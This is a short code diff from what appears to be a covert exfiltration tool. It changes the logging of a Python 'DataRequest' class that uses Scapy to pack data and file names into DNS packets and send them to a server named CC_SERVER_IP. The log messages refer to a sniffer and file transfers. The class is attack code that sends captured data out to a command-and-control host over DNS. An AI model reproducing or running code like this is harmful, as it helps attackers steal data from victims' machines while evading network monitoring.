@@ -16,8 +16,7 @@ class DataRequest:
     
     def build(self):
         reformatted_filename = "." + self.filename + ("." if self.filename.index('.') == -1 else "") 
-        print(self.data)
-        
+
         ether = Ether()
         ip = IP(dst=CC_SERVER_IP)
         udp = UDP(sport=PACKET_OPTIONS['UDP']['SPORT'], dport=PACKET_OPTIONS['UDP']['DPORT'])
@@ -33,5 +32,13 @@ class DataRequest:
         return ether/ip/udp/dns
     
     def send(self):
-        print(self.build().show())
+        if self.type == 0:
+            print("[Sniffer] Beginning data transfer...")
+
+        elif self.type == 2:
+            print("[Sniffer] File transfer completed.")
+
+        else:
+            print("[Sniffer] Sending Data:\n\t {}".format(self.data))
+                
         sendp(x=self.build(), iface=INTERFACE, verbose=0)
